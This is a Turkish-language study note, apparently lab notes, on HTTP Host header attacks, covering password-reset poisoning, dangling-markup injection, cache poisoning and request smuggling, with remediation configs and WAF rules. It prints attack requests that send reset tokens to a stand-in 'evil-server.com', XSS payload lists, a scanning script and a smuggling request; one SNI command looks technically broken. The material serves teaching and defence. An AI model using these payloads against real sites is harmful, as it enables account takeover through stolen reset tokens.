# Host Header Manipulations (Host Başlığı Manipülasyonları)

## Giriş

Host Header Manipulations, HTTP Host başlığının manipüle edilerek web uygulamalarında güvenlik açıkları oluşturulması tekniğidir. Bu zafiyet türü, özellikle shared hosting ortamları, reverse proxy konfigürasyonları ve password reset mekanizmalarında kritik güvenlik riskleri yaratır.

## Temel Kavramlar

### Shared Hosting ve Host Header

**Neden Host Header Önemli?**
- IPv4 adres sayısı < Domain sayısı → Shared hosting gereksinimi
- Tek IP adresinde birden fazla domain barındırılması
- Reverse proxy'ler (Apache, Nginx, Tomcat) Host header'a göre routing yapar
- Web uygulamaları dinamik URL oluşturma için Host header'ı kullanır

![Host Header Architecture](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/45bda1e2-610b-4c16-95f6-213fee594eb0)

### Framework URL Oluşturma

Modern web framework'leri URL oluşturma için Host header bilgisini kullanır:

```csharp
// ASP.NET örneği
var baseUrl = Request.Url.ToString();  // Host header'dan alınır
var resetLink = $"{baseUrl}/reset-password?token={token}";
```

```php
// PHP örneği  
$host = $_SERVER['HTTP_HOST'];
$resetUrl = "https://{$host}/reset?token={$token}";
```

![Framework URL Generation](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/b668a3c0-988d-4bab-8cdf-29643a11452a)

## Saldırı Vektörleri

### 1. Password Reset Poisoning

**Saldırı Mekanizması:**
1. Password reset isteği gönderilir
2. Host header manipüle edilir  
3. Uygulama saldırgan kontrolündeki domain ile reset linki oluşturur
4. Kurban reset linkine tıkladığında token saldırgana düşer

### 2. Cache Poisoning

**Senaryo:**
- Manipüle edilen Host header ile XSS payload'u inject edilir
- Response cache mekanizmaları tarafından cache'lenir
- Aynı cached içerik diğer kullanıcılara da sunulur
- Stored XSS etkisi yaratılır

### 3. Server-Side Request Forgery (SSRF)

**Internal Service Access:**
- Host header ile internal servis hostname'leri belirtilir
- Reverse proxy yanlış konfigürasyonu ile internal servislere erişim
- DMZ'deki servislerin exposed edilmesi

## Lab 1: Basic Password Reset Poisoning

### Senaryo Açıklaması

Bu laboratuvarda, password reset fonksiyonunun Host header'ı kullanarak reset linkini oluşturduğu bir zafiyet bulunmaktadır. Saldırgan, Host header'ı manipüle ederek reset token'ını kendi kontrol ettiği servera yönlendirebilir.

### Zafiyet Analizi

**Vulnerable Process:**
1. Kullanıcı password reset talebinde bulunur
2. Uygulama HTML email render eder
3. Email içinde full URL oluşturulması gerekir
4. **Host header dinamik olarak kullanılır** (hard-coded olamaz)

![Password Reset Flow](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/3dc0e01c-63e1-46c3-a70f-dabfdf85de07)

### Saldırı Adımları

1. **Normal Request Intercept:**
   ```http
   POST /forgot-password HTTP/1.1
   Host: vulnerable-app.com
   Content-Type: application/x-www-form-urlencoded
   
   username=carlos
   ```

2. **Host Header Manipulation:**
   ```http
   POST /forgot-password HTTP/1.1
   Host: evil-server.com?
   Content-Type: application/x-www-form-urlencoded
   
   username=carlos
   ```

3. **Generated Email Content:**
   ```html
   <!-- Orijinal -->
   <a href="https://vulnerable-app.com/reset?token=abc123">Reset Password</a>
   
   <!-- Manipüle edilmiş -->
   <a href="https://evil-server.com?/reset?token=abc123">Reset Password</a>
   ```

### Teknik Detaylar

**Query String Bypass:**
- `Host: evil-server.com?` kullanımı
- `?` karakteri sonrasındaki kısmı query string'e dönüştürür
- Router confusion'ı önler
- Reverse proxy doğru routing yapar

**Log Monitoring:**
```bash
# Saldırgan sunucusu access log'u
evil-server.com - [23/Sep/2024] "GET /?/reset?token=abc123def456 HTTP/1.1" 200 -
```

### Korunma Yöntemleri

1. **Hard-coded Base URL:**
   ```php
   // Yanlış
   $resetUrl = "https://{$_SERVER['HTTP_HOST']}/reset?token={$token}";
   
   // Doğru
   define('BASE_URL', 'https://trusted-domain.com');
   $resetUrl = BASE_URL . "/reset?token={$token}";
   ```

2. **Host Header Validation:**
   ```python
   ALLOWED_HOSTS = ['trusted-domain.com', 'www.trusted-domain.com']
   
   def validate_host(request):
       host = request.headers.get('Host', '').split(':')[0]
       if host not in ALLOWED_HOSTS:
           raise SecurityError("Invalid host header")
   ```

## Lab 2: Password Reset Poisoning via Dangling Markup

### Senaryo Açıklaması

Bu laboratuvarda, Host header'da özel karakterlerin filtrelenmemesi nedeniyle "dangling markup" injection saldırısı gerçekleştirilebilir. Bu teknik, HTML parser'ın davranışını manipüle ederek hassas bilgileri çalmaya olanak sağlar.

### Zafiyet Analizi

**Problem:** Host header'da tek tırnak (') karakterinin filtrelenmesi ancak diğer HTML karakterlerinin izin verilmesi.

![Dangling Markup Attack](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/d9480033-48d5-4aeb-802c-1f4ff5dc5492)

### Saldırı Vektörü

**Payload Construction:**
```http
Host: vulnerable-app.com:80"></a><img src="http://evil-server.com/?
```

**Generated HTML:**
```html
<!-- Orijinal beklenen -->
<a href="https://vulnerable-app.com/reset?token=secret123">Click here to reset</a>

<!-- Injection sonucu -->
<a href="https://vulnerable-app.com:80"></a><img src="http://evil-server.com/?/reset?token=secret123">Click here to reset</a>
```

### Teknik Analiz

**Parsing Layers:**

1. **Reverse Proxy Layer:**
   ```
   Host: vulnerable-app.com:80"></a><img src="http://evil-server.com/?
   ```
   - `:80` sonrasını ignore eder
   - `vulnerable-app.com` olarak parse eder
   - İsteği backend'e forward eder

2. **Application Layer:**
   ```
   Full Host header kullanılır → HTML injection gerçekleşir
   ```

![Parsing Layers](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/d8798005-9f95-478b-9e76-19db8657558e)

### Advanced Payload

**Optimized Injection:**
```http
Host: vulnerable-app.com:80"></a><img src="http://evil-server.com/?
```

**Sonuç:**
- `</a>` tagi kapatır
- `<img src="` yeni tag açar ancak kapatmaz
- Parser kalan tüm içeriği `src` attribute'una dahil eder
- Password link evil-server.com'a exfiltrate edilir

![Advanced Payload Result](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/6509a7d8-5327-4e15-af48-ce89374e18a7)

### Korunma Yöntemleri

1. **Context-Aware Encoding:**
   ```php
   function htmlEncode($input, $context = 'html') {
       switch($context) {
           case 'html':
               return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
           case 'url':
               return urlencode($input);
           case 'js':
               return json_encode($input);
       }
   }
   
   // Kullanım
   $safeHost = htmlEncode($_SERVER['HTTP_HOST'], 'html');
   ```

2. **Strict Host Validation:**
   ```python
   import re
   
   def validate_host_header(host):
       # Sadece alfanumerik, dash ve nokta karakterlerine izin ver
       if not re.match(r'^[a-zA-Z0-9.-]+$', host):
           raise ValueError("Invalid characters in host header")
       
       # Port numarası kontrolü
       if ':' in host:
           hostname, port = host.split(':', 1)
           if not port.isdigit() or not (1 <= int(port) <= 65535):
               raise ValueError("Invalid port number")
       
       return host
   ```

![Context Encoding](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/531fc9ff-c4a4-4a31-9a71-7d0cd278909d)

## Gerçek Dünya Örnekleri

### 1. Django Host Header Validation

**Vulnerable Configuration:**
```python
# settings.py
ALLOWED_HOSTS = ['*']  # Tüm host'lara izin - TEHLİKELİ!
```

**Secure Configuration:**
```python
# settings.py
ALLOWED_HOSTS = [
    'example.com',
    'www.example.com',
    '.example.com',  # Subdomain'lere izin ver
]
```

### 2. Reverse Proxy Misconfiguration

**Nginx Vulnerable Config:**
```nginx
server {
    listen 80;
    server_name _;  # Tüm host'lara cevap ver - TEHLİKELİ!
    
    location / {
        proxy_pass http://backend;
        proxy_set_header Host $host;  # Arbitrary host forward edilir
    }
}
```

**Secure Configuration:**
```nginx
server {
    listen 80;
    server_name example.com www.example.com;
    
    # Host header validation
    if ($host !~* ^(example\.com|www\.example\.com)$) {
        return 444;  # Connection close
    }
    
    location / {
        proxy_pass http://backend;
        proxy_set_header Host example.com;  # Sabit host gönder
    }
}
```

### 3. Apache Virtual Host

**Problematic Setup:**
```apache
<VirtualHost *:80>
    ServerName *
    DocumentRoot /var/www/html
</VirtualHost>
```

**Secure Setup:**
```apache
<VirtualHost *:80>
    ServerName example.com
    ServerAlias www.example.com
    DocumentRoot /var/www/html
    
    # Default virtual host - diğer tüm host'ları yakala
</VirtualHost>

<VirtualHost *:80>
    ServerName default
    DocumentRoot /var/www/error
    
    # 403 döndür
    <Directory "/var/www/error">
        Require all denied
    </Directory>
</VirtualHost>
```

## Detection ve Testing

### 1. Manual Testing

**Basic Host Header Manipulation:**
```bash
# Normal request
curl -H "Host: legitimate-site.com" http://target.com/

# Manipulated host
curl -H "Host: evil.com" http://target.com/

# Port manipulation  
curl -H "Host: legitimate-site.com:80fake" http://target.com/

# Special characters
curl -H "Host: legitimate-site.com'><script>alert(1)</script>" http://target.com/
```

### 2. Automated Testing

**Burp Suite Extension:**
```python
def test_host_header_injection(base_request):
    payloads = [
        "evil.com",
        "evil.com:80",
        "evil.com'><script>alert(1)</script>",
        "evil.com\"><img src=x onerror=alert(1)>",
        "127.0.0.1",
        "localhost"
    ]
    
    for payload in payloads:
        modified_request = base_request.replace(
            "Host: legitimate.com", 
            f"Host: {payload}"
        )
        response = send_request(modified_request)
        analyze_response(response, payload)
```

### 3. Automated Scanner

**Custom Python Script:**
```python
import requests
import re

def scan_host_header_injection(target_url):
    test_host = "evil-test-domain.com"
    
    headers = {"Host": test_host}
    response = requests.get(target_url, headers=headers)
    
    # Response'da test domain'imiz var mı?
    if test_host in response.text:
        print(f"[VULN] Host header injection found: {target_url}")
        
        # Dangling markup test
        dangling_payload = f'legitimate.com"><img src="http://{test_host}/?'
        headers["Host"] = dangling_payload
        
        response2 = requests.get(target_url, headers=headers)
        if "img src" in response2.text:
            print(f"[CRITICAL] Dangling markup injection possible")
    
    return response
```

## Monitoring ve Defense

### 1. Web Application Firewall (WAF)

**Host Header Rules:**
```yaml
# ModSecurity rules
SecRule REQUEST_HEADERS:Host "@rx ^[a-zA-Z0-9.-]+$" \
    "id:1001,phase:1,block,msg:'Invalid characters in Host header'"

SecRule REQUEST_HEADERS:Host "@rx <|>|'|\"" \
    "id:1002,phase:1,block,msg:'HTML injection attempt in Host header'"

SecRule REQUEST_HEADERS:Host "@rx javascript:|data:|vbscript:" \
    "id:1003,phase:1,block,msg:'Script injection in Host header'"
```

### 2. Application Level Monitoring

**Logging Suspicious Hosts:**
```python
import logging
from urllib.parse import urlparse

def monitor_host_header(request):
    host = request.headers.get('Host', '')
    
    # Suspicious patterns
    suspicious_patterns = [
        '<', '>', '"', "'", 'javascript:', 'data:',
        'localhost', '127.0.0.1', '0.0.0.0'
    ]
    
    for pattern in suspicious_patterns:
        if pattern in host.lower():
            logging.warning(f"Suspicious host header: {host} from IP: {request.remote_addr}")
            return False
    
    # Validate against allowed hosts
    allowed_hosts = ['example.com', 'www.example.com']
    parsed_host = host.split(':')[0]  # Remove port
    
    if parsed_host not in allowed_hosts:
        logging.warning(f"Unknown host header: {host} from IP: {request.remote_addr}")
        return False
    
    return True
```

### 3. Network Level Protection

**Load Balancer Configuration:**
```json
{
  "rules": [
    {
      "name": "block-invalid-hosts",
      "condition": {
        "host": {
          "not_in": ["example.com", "www.example.com"]
        }
      },
      "action": "deny"
    },
    {
      "name": "block-html-injection",
      "condition": {
        "host": {
          "regex": "[<>\"']"
        }
      },
      "action": "deny"
    }
  ]
}
```

## İleri Düzey Saldırı Teknikleri

### 1. HTTP Request Smuggling ile Kombine

```http
POST / HTTP/1.1
Host: legitimate.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: internal-admin.local
```

### 2. Server Name Indication (SNI) Confusion

```bash
# HTTPS'te Host header ile SNI'ın farklı olması
openssl s_client -connect target:443 -servername legitimate.com \
    -quiet -verify_hostname legitimate.com | \
    echo -e "GET / HTTP/1.1\r\nHost: evil.com\r\n\r\n"
```

### 3. IPv6 Bypass

```http
Host: [::1]:8080
Host: [2001:db8::1]
Host: [::ffff:127.0.0.1]
```

## Kaynaklar

- [PortSwigger Host Header Attacks](https://portswigger.net/web-security/host-header)
- [OWASP Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)
- [RFC 7230 - HTTP/1.1 Message Syntax](https://tools.ietf.org/html/rfc7230#section-5.4)
- [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)